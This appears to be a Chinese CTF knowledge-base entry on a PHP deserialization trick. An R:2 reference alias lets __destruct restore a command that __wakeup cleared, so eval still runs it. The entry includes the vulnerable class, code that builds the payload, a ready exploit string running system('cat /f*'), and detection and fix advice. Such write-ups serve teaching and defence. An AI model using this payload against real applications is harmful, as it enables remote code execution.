---
id: web-php-deserialization-wakeup-reference-alias-bypass
title: PHP __wakeup 重置失效：属性引用别名（R:2）让 __destruct 写回命令后 eval
type: scenario
domain: web
path: web/php/deserialization
technique: php-wakeup-reference-alias-bypass
aliases:
- 同内存地址绕过 __wakeup
- 引用绕过 __wakeup
- a=&b 反序列化
- R:2 引用
- test 类 __destruct eval
tags:
- php
- deserialization
- wakeup-bypass
- reference
- r-reference
- eval
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V172
  verified_at: '2026-11-06T17:01:43+08:00'
  notes: 已对照原文同内存地址绕过段落核对：test类__wakeup置空a、__destruct先b=c后eval(a)、R:2引用别名使写回覆盖重置、preg_match(/test":3/i)过滤与payload长度18均一致；无sources/source_url；未在本机复跑
---

## 一句话结论

攻击者用 `R:2` 把被 `__wakeup()` 重置的属性 `a` 与另一个属性 `b` 绑定为同一块内存，`__wakeup()` 虽然把 `a` 清空，但 `__destruct()` 中 `$this->b = $this->c` 的赋值会通过别名同步写回 `a`，随后 `eval($this->a)` 执行的仍是攻击者放在 `c` 中的命令，从而实现重置绕过。

## 原理

- **引用是序列化格式的一部分**：`serialize()` 遇到两个指向同一 zval 的属性会输出 `R:<序号>`；反序列化时恢复为引用别名。例如 `$this->a =& $this->b` 序列化后为 `s:1:"a";N;s:1:"b";R:2;`，`R:2` 表示属性 `b` 引用序列化流中的第 2 个值（即 `a` 的 `N`）。
- **执行顺序**：`unserialize()` 先恢复属性，再调用 `__wakeup()`，对象销毁时才调用 `__destruct()`。`__wakeup()` 里的 `$this->a = ''` 只改变这块共享内存的内容，并不会解除 `a` 与 `b` 的别名关系。
- **写回**：`__destruct()` 执行 `$this->b = $this->c` 时，由于 `b` 是 `a` 的别名，赋值同时把 `c`（攻击者控制的命令字符串）写进了 `a`。随后 `eval($this->a)` 执行命令，`__wakeup()` 的清空操作被“晚到的写回”覆盖。
- **为什么不用改属性计数**：该技巧保持对象声明的属性个数与真实个数一致，因此不受 CVE-2016-7124 修复影响，也不触发“属性数不匹配”的结构异常；它利用的是对象生命周期与引用语义，而非解析器缺陷。
- 该技巧要求目标类同时满足：`__wakeup()` 重置某个属性、`__destruct()` 通过另一个属性给该属性赋值（或该属性后来被其他逻辑赋值）、最终 sink 使用被重置的属性。

## 触发条件

- 应用对用户输入调用 `unserialize()`，且允许实例化目标类。
- 目标类存在 `__wakeup()` 重置属性、`__destruct()`（或其他晚于 `__wakeup` 的魔术方法）向被重置属性写入可控值。
- 存在使用该属性的敏感 sink（`eval`、`include`、命令函数、文件读取等）。
- PHP 版本支持 `R:`/`r:` 引用反序列化（PHP 5/7/8 均支持，无特定版本限制）。

## 利用步骤

1. 审源码确认 `__wakeup()` 重置哪个属性、`__destruct()` 如何通过另一个属性给它赋值、sink 读取哪个属性。
2. 在本地类中把“被重置属性”与“会被析构函数赋值的属性”用 `&` 绑定，例如 `$this->a =& $this->b`。
3. 把攻击者命令放入第三个属性 `c`，序列化得到含 `R:` 的 payload。
4. 按目标入口的过滤条件调整（本题要求序列化串中出现 `test":3`，保持 3 个属性即可满足）。
5. 提交 payload，`__wakeup` 清空后由 `__destruct` 的别名赋值恢复命令并执行。

## PoC

目标类（原文例题简化）：

```php
class test {
    public $a; public $b; public $c;
    public function __construct() { $this->a = 1; $this->b = 2; $this->c = 3; }
    public function __wakeup() { $this->a = ''; }
    public function __destruct() { $this->b = $this->c; eval($this->a); }
}
$a = $_GET['a'];
if (!preg_match('/test":3/i', $a)) { die('你输入的不正确！！！搞什么！！'); }
unserialize($_GET['a']);
```

本地生成：

```php
class test {
    public $a; public $b; public $c;
    public function __construct() {
        $this->a =& $this->b;          // a、b 共享内存
        $this->c = "system('cat /f*');";
    }
}
echo serialize(new test());
// O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:18:"system('cat /f*');";}
```

提交：

```text
?a=O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:18:"system('cat /f*');";}
```

执行流：`unserialize` 恢复 a/b 别名 → `__wakeup` 置空 a（b 同步为空）→ `__destruct` 执行 `b = c`（a 同步为命令）→ `eval(a)` 执行 `system('cat /f*')`。原文未在本机复跑。

## 变体与关联

- 若 `__destruct` 直接给被重置属性赋值（如 `$this->a = $this->c`），则不需要引用别名，直接构造即可。
- 若重置发生在 `__construct` 而非 `__wakeup`，可把触发点换成构造器或 `__wakeup`；核心是“重置后仍有通过别名写回的机会”。
- 关联：[[web-php-deserialization-wakeup-property-count-bypass]]（属性数绕过，与本题互补）、[[web-php-deserialization-reference-callback-array-constructor-reset]]（引用绑定回调数组）、[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链）。
- 边界：若应用在反序列化后立即重新赋值/重新序列化、或使用 `allowed_classes` 白名单禁止目标类，技巧失效。

## 检测与防御

- 检测：请求参数中出现 `R:`/`r:` 引用标记，尤其是与 `__wakeup`/`__destruct` 相关类的属性名同时出现；反序列化后出现 `eval` 执行或命令输出。
- 修复：不要对不可信输入使用 `unserialize()`，改用 JSON；必须使用时设置 `allowed_classes` 白名单并校验属性结构。
- 加固：不要把 `__wakeup` 的重置当作安全边界；删除 `__destruct`/`__wakeup` 中的 `eval`、动态调用与文件操作；对敏感属性做类型和取值校验。
